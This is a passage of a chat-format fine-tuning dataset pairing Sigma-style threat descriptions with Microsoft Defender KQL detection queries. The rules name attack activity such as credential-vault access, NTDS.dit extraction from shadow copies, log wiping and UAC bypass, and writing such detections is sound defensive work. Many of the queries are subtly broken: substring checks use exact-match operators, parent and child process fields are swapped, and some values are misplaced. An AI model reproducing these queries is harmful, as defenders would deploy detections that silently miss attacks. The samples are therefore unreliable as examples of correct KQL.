\"\\\\Windows\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\" or FolderPath contains \"\\\\Windows\\\\System32\\\\Tasks\\\\\")) and (not(((ProcessCommandLine endswith \"-Embedding\" and FolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\\" and InitiatingProcessFolderPath =~ \"\\\\FileCoAuth.exe\") or (ProcessCommandLine endswith \"-Embedding\" and InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects various indicators of Microsoft Connection Manager Profile Installer execution Topic: proc_creation_win_cmstp_execution_by_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\cmstp.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects connections with Azure Front Door (known legitimate service that can be leveraged for C2)\nthat fall outside of known benign behavioral baseline (not using common apps or common azurefd.net endpoints)\n Topic: net_connection_win_susp_azurefd_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where RemoteUrl =~ \"azurefd.net\" and (not((InitiatingProcessFolderPath =~ \"searchapp.exe\" or (RemoteUrl in~ (\"afdxtest.z01.azurefd.net\", \"fp-afd.azurefd.net\", \"fp-afdx-bpdee4gtg6frejfd.z01.azurefd.net\", \"roxy.azurefd.net\", \"powershellinfraartifacts-gkhedzdeaghdezhr.z01.azurefd.net\", \"storage-explorer-publishing-feapcgfgbzc2cjek.b01.azurefd.net\", \"graph.azurefd.net\")) or (InitiatingProcessFolderPath in~ (\"brave.exe\", \"chrome.exe\", \"chromium.exe\", \"firefox.exe\", \"msedge.exe\", \"msedgewebview2.exe\", \"opera.exe\", \"vivaldi.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing OneNote attachments Topic: file_event_win_office_onenote_files_in_susp_locations"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".one\", \".onepkg\")) and (not((InitiatingProcessFolderPath has_all (\"\\\\ONENOTE.EXE\") and InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Office\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"network\" flag in order to retrieve information about the network configuration. Topic: proc_creation_lnx_esxcli_network_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" get\", \" list\")) and (ProcessCommandLine =~ \"network\" and InitiatingProcessFolderPath =~ \"/esxcli\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups. Topic: proc_creation_win_pua_advanced_ip_scanner"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/portable\", \"/lng\")) or (FolderPath contains \"\\\\advanced_ip_scanner\" or ProcessVersionInfoOriginalFileName contains \"advanced_ip_scanner\" or ProcessVersionInfoFileDescription contains \"Advanced IP Scanner\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes spawned from browsers. This could be a result of a potential web browser exploitation. Topic: proc_creation_macos_susp_browser_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"com.apple.WebKit.WebContent\", \"firefox\", \"Google Chrome Helper\", \"Google Chrome\", \"Microsoft Edge\", \"Opera\", \"Safari\", \"Tor Browser\")) and (InitiatingProcessFolderPath in~ (\"/bash\", \"/curl\", \"/dash\", \"/ksh\", \"/osascript\", \"/perl\", \"/php\", \"/pwsh\", \"/python\", \"/sh\", \"/tcsh\", \"/wget\", \"/zsh\"))) and (not((((InitiatingProcessFileName in~ (\"Google Chrome Helper\", \"Google Chrome\")) and ((ProcessCommandLine contains \"/Volumes/Google Chrome/Google Chrome.app/Contents/Frameworks/\" and ProcessCommandLine contains \"/Resources/install.sh\") or (ProcessCommandLine contains \"/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/\" and ProcessCommandLine contains \"/Resources/keystone_promote_preflight.sh\") or (ProcessCommandLine contains \"/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/\" and ProcessCommandLine contains \"/Resources/keystone_promote_postflight.sh\"))) or ((InitiatingProcessFileName in~ (\"Google Chrome Helper\", \"Google Chrome\")) and (ProcessCommandLine in~ (\"/Users/\", \"/Library/Application Support/Google/Chrome/recovery/\", \"/ChromeRecovery\"))) or ProcessCommandLine =~ \"--defaults-torrc\" or ProcessCommandLine =~ \"/Library/Application Support/Microsoft/MAU*/Microsoft AutoUpdate.app/Contents/MacOS/msupdate\" or (InitiatingProcessFileName =~ \"Microsoft Edge\" and (ProcessCommandLine in~ (\"IOPlatformExpertDevice\", \"hw.model\")))))) and (not((ProcessCommandLine =~ \"\" or isnull(ProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups. Topic: file_event_win_advanced_ip_scanner"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\Advanced IP Scanner 2\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the Installation of a Exchange Transport Agent Topic: proc_creation_win_powershell_msexchange_transport_agent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Install-TransportAgent\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated Powershell via use MSHTA in Scripts Topic: proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"set\", \"&&\", \"mshta\", \"vbscript:createobject\", \".run\", \"(window.close)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to clear logs on the system. Adversaries may clear system logs to hide evidence of an intrusion Topic: proc_creation_lnx_clear_logs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/var/log\", \"/var/spool/mail\")) and (InitiatingProcessFolderPath in~ (\"/rm\", \"/shred\", \"/unlink\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a curl process start on Windows, which could indicates a file download from a remote location or a simple web request to a remote server Topic: proc_creation_win_curl_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoProductName =~ \"The curl executable\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\n Topic: proc_creation_win_susp_sensitive_file_access_shadowcopy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\" and (ProcessCommandLine in~ (\"\\\\NTDS.dit\", \"\\\\SYSTEM\", \"\\\\SECURITY\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n Topic: registry_set_internet_explorer_disable_first_run_customize"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\DisableFirstRunCustomize\" and (RegistryValueData in~ (\"DWORD (0x00000001)\", \"DWORD (0x00000002)\"))) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\System32\\\\ie4uinit.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\nMalware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\n Topic: proc_creation_win_wscript_cscript_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\wscript.exe\", \"\\\\cscript.exe\")) and (InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\" or ((InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and ((ProcessCommandLine in~ (\"mshta\", \"http\")) or (ProcessCommandLine in~ (\"rundll32\", \"regsvr32\", \"msiexec\"))))) and (not(((ProcessCommandLine in~ (\"UpdatePerUserSystemParameters\", \"PrintUIEntry\", \"ClearMyTracksByProcess\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect changes to the \"LegalNoticeCaption\" or \"LegalNoticeText\" registry values where the message set contains keywords often used in ransomware ransom messages Topic: registry_set_legalnotice_susp_message"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\LegalNoticeCaption\" or RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\LegalNoticeText\") and (RegistryValueData contains \"encrypted\" or RegistryValueData contains \"Unlock-Password\" or RegistryValueData contains \"paying\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\nThe DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\n Topic: proc_creation_win_powershell_dsinternals_cmdlets"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Add-ADDBSidHistory\", \"Add-ADNgcKey\", \"Add-ADReplNgcKey\", \"ConvertFrom-ADManagedPasswordBlob\", \"ConvertFrom-GPPrefPassword\", \"ConvertFrom-ManagedPasswordBlob\", \"ConvertFrom-UnattendXmlPassword\", \"ConvertFrom-UnicodePassword\", \"ConvertTo-AADHash\", \"ConvertTo-GPPrefPassword\", \"ConvertTo-KerberosKey\", \"ConvertTo-LMHash\", \"ConvertTo-MsoPasswordHash\", \"ConvertTo-NTHash\", \"ConvertTo-OrgIdHash\", \"ConvertTo-UnicodePassword\", \"Disable-ADDBAccount\", \"Enable-ADDBAccount\", \"Get-ADDBAccount\", \"Get-ADDBBackupKey\", \"Get-ADDBDomainController\", \"Get-ADDBGroupManagedServiceAccount\", \"Get-ADDBKdsRootKey\", \"Get-ADDBSchemaAttribute\", \"Get-ADDBServiceAccount\", \"Get-ADDefaultPasswordPolicy\", \"Get-ADKeyCredential\", \"Get-ADPasswordPolicy\", \"Get-ADReplAccount\", \"Get-ADReplBackupKey\", \"Get-ADReplicationAccount\", \"Get-ADSIAccount\", \"Get-AzureADUserEx\", \"Get-BootKey\", \"Get-KeyCredential\", \"Get-LsaBackupKey\", \"Get-LsaPolicy\", \"Get-SamPasswordPolicy\", \"Get-SysKey\", \"Get-SystemKey\", \"New-ADDBRestoreFromMediaScript\", \"New-ADKeyCredential\", \"New-ADNgcKey\", \"New-NTHashSet\", \"Remove-ADDBObject\", \"Save-DPAPIBlob\", \"Set-ADAccountPasswordHash\", \"Set-ADDBAccountPassword\", \"Set-ADDBBootKey\", \"Set-ADDBDomainController\", \"Set-ADDBPrimaryGroup\", \"Set-ADDBSysKey\", \"Set-AzureADUserEx\", \"Set-LsaPolicy\", \"Set-SamAccountPasswordHash\", \"Set-WinUserPasswordHash\", \"Test-ADDBPasswordQuality\", \"Test-ADPasswordQuality\", \"Test-ADReplPasswordQuality\", \"Test-PasswordQuality\", \"Unlock-ADDBAccount\", \"Write-ADNgcKey\", \"Write-ADReplNgcKey\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\" Topic: proc_creation_win_powershell_cl_invocation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"SyncInvoke \""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects malicious indicators seen used by the Goofy Guineapig malware Topic: file_event_win_malware_goofy_guineapig_file_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"C:\\\\ProgramData\\\\GoogleUpdate\\\\config.dat\", \"C:\\\\ProgramData\\\\GoogleUpdate\\\\GoogleUpdate.exe\", \"C:\\\\ProgramData\\\\GoogleUpdate\\\\GoogleUpdate\\\\tmp.bat\", \"C:\\\\ProgramData\\\\GoogleUpdate\\\\goopdate.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of a Microsoft signed script executing a managed DLL with PowerShell. Topic: proc_creation_win_lolbin_utilityfunctions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"UtilityFunctions.ps1\", \"RegSnapin \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects APT31 Judgement Panda activity as described in the Crowdstrike 2019 Global Threat Report Topic: proc_creation_win_apt_apt31_judgement_panda"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\aaaa\\\\procdump64.exe\", \"\\\\aaaa\\\\netsess.exe\", \"\\\\aaaa\\\\7za.exe\", \"\\\\c$\\\\aaaa\\\\\")) or (ProcessCommandLine in~ (\"ldifde\", \"-f -n\", \"eprod.ldf\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter. Topic: proc_creation_win_lolbin_visual_basic_compiler"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\vbc.exe\" and InitiatingProcessFolderPath =~ \"\\\\cvtres.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location. Topic: proc_creation_win_wermgr_susp_exec_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\wermgr.exe\" and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of NSudo tool for command execution Topic: proc_creation_win_pua_nsudo"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-U:S \", \"-U:T \", \"-U:E \", \"-P:E \", \"-M:S \", \"-M:H \", \"-U=S \", \"-U=T \", \"-U=E \", \"-P=E \", \"-M=S \", \"-M=H \", \"-ShowWindowMode:Hide\")) and ((FolderPath endswith \"\\\\NSudo.exe\" or FolderPath endswith \"\\\\NSudoLC.exe\" or FolderPath endswith \"\\\\NSudoLG.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"NSudo.exe\", \"NSudoLC.exe\", \"NSudoLG.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new service using powershell. Topic: proc_creation_win_powershell_create_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"New-Service\", \"-BinaryPathName\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user installs certificates by using CertOC.exe to loads the target DLL file. Topic: proc_creation_win_certoc_load_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\certoc.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertOC.exe\") and (ProcessCommandLine contains \" -LoadDLL \" or ProcessCommandLine contains \" /LoadDLL \" or ProcessCommandLine contains \" \u2013LoadDLL \" or ProcessCommandLine contains \" \u2014LoadDLL \" or ProcessCommandLine contains \" \u2015LoadDLL \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system. Topic: proc_creation_macos_create_account"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"create\" and InitiatingProcessFolderPath =~ \"/dscl\") or (ProcessCommandLine =~ \"addUser\" and InitiatingProcessFolderPath =~ \"/sysadminctl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the \"iscsicpl.exe\" UAC bypass technique that leverages a DLL Search Order hijacking technique to load a custom DLLs from temp or a any user controlled location in the users %PATH% Topic: image_load_uac_bypass_iscsicpl"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\SysWOW64\\\\iscsicpl.exe\" and FolderPath endswith \"\\\\iscsiexe.dll\") and (not((FolderPath contains \"C:\\\\Windows\\\\\" and FolderPath contains \"iscsiexe.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "A symbolic link is a type of file that contains a reference to another file.\nThis is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\n Topic: proc_creation_win_fsutil_symlinkevaluation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"behavior \", \"set \", \"SymlinkEvaluation\")) and (FolderPath endswith \"\\\\fsutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"fsutil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious processes based on name and location that access the windows credential manager and vault.\nWhich can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::cred\" function\n Topic: file_access_win_susp_credential_manager_access"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\\" or FileName contains \"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Credentials\\\\\" or FileName contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\Vault\\\\\" or FileName contains \"\\\\ProgramData\\\\Microsoft\\\\Vault\\\\\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uses of a renamed legitimate createdump.exe LOLOBIN utility to dump process memory Topic: proc_creation_win_renamed_createdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine contains \" -u \" and ProcessCommandLine contains \" -f \" and ProcessCommandLine contains \".dmp\") or (ProcessCommandLine contains \" --full \" and ProcessCommandLine contains \" --name \" and ProcessCommandLine contains \".dmp\")) or ProcessVersionInfoOriginalFileName =~ \"FX_VER_INTERNALNAME_STR\") and (not(InitiatingProcessFolderPath =~ \"\\\\createdump.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks Topic: proc_creation_win_ultravnc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"VNCViewer\" or ProcessVersionInfoProductName =~ \"UltraVNC VNCViewer\" or ProcessVersionInfoCompanyName =~ \"UltraVNC\" or ProcessVersionInfoOriginalFileName =~ \"VNCViewer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of system DLLs that are not present on the system by default (at least not in system directories).\nUsually this technique is used to achieve UAC bypass or privilege escalation.\n Topic: image_load_side_load_non_existent_dlls"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \":\\\\Windows\\\\System32\\\\TSMSISrv.dll\" or FolderPath endswith \":\\\\Windows\\\\System32\\\\TSVIPSrv.dll\" or FolderPath endswith \":\\\\Windows\\\\System32\\\\wbem\\\\wbemcomn.dll\" or FolderPath endswith \":\\\\Windows\\\\System32\\\\WLBSCTRL.dll\" or FolderPath endswith \":\\\\Windows\\\\System32\\\\wow64log.dll\" or FolderPath endswith \":\\\\Windows\\\\System32\\\\WptsExtensions.dll\") and (not((InitiatingProcessVersionInfoCompanyName =~ \"Valid\" and InitiatingProcessVersionInfoOriginalFileName =~ \"Microsoft Windows\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Microsoft Word loading an Add-In (.wll) file which can be used by threat actors for initial access or persistence.\n Topic: image_load_office_word_wll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \".wll\" and InitiatingProcessFolderPath =~ \"\\\\winword.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system Topic: proc_creation_win_devinit_lolbin_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" -t msi-install \", \" -i http\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects suspicious files created by Microsoft Sync Center (mobsync) Topic: file_event_win_susp_creation_by_mobsync"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"\\\\mobsync.exe\" and (FileName in~ (\".dll\", \".exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products Topic: proc_creation_win_reg_delete_safeboot"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" delete \", \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\")) and (FolderPath endswith \"reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the chattr utility to remove immutable file attribute. Topic: proc_creation_lnx_chattr_immutable_removal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -i \" and InitiatingProcessFolderPath =~ \"/chattr\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\nAttackers often try to enumerate the services currently running on a system in order to find different attack vectors.\n Topic: proc_creation_win_sc_query_interesting_services"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"query\" and ProcessCommandLine =~ \"termservice\" and (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell scripts to set the ACL to a file in the Windows folder Topic: proc_creation_win_powershell_set_acl_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Set-Acl \", \"-AclObject \")) and ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or (FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\")) and (ProcessCommandLine in~ (\"-Path \\\"C:\\\\Windows\", \"-Path 'C:\\\\Windows\", \"-Path %windir%\", \"-Path $env:windir\")) and (ProcessCommandLine in~ (\"FullControl\", \"Allow\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence and execution of Inveigh via dropped artefacts Topic: file_event_win_hktl_inveigh_artefacts"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\Inveigh-Log.txt\", \"\\\\Inveigh-Cleartext.txt\", \"\\\\Inveigh-NTLMv1Users.txt\", \"\\\\Inveigh-NTLMv2Users.txt\", \"\\\\Inveigh-NTLMv1.txt\", \"\\\\Inveigh-NTLMv2.txt\", \"\\\\Inveigh-FormInput.txt\", \"\\\\Inveigh.dll\", \"\\\\Inveigh.exe\", \"\\\\Inveigh.ps1\", \"\\\\Inveigh-Relay.ps1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a cat /etc/sudoers to list all users that have sudo rights Topic: proc_creation_lnx_cat_sudoers"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /etc/sudoers\" and (InitiatingProcessFolderPath in~ (\"/cat\", \"grep\", \"/head\", \"/tail\", \"/more\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker registers a new AMSI provider in order to achieve persistence Topic: registry_add_persistence_amsi_providers"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryKeyCreated\" and (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\AMSI\\\\Providers*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\AMSI\\\\Providers*\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL. Topic: registry_set_persistence_comhijack_psfactorybuffer"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\CLSID\\\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\\\InProcServer32\\\\(Default)\" and (not((RegistryValueData in~ (\"%windir%\\\\System32\\\\ActXPrxy.dll\", \"C:\\\\Windows\\\\System32\\\\ActXPrxy.dll\"))))"}]}
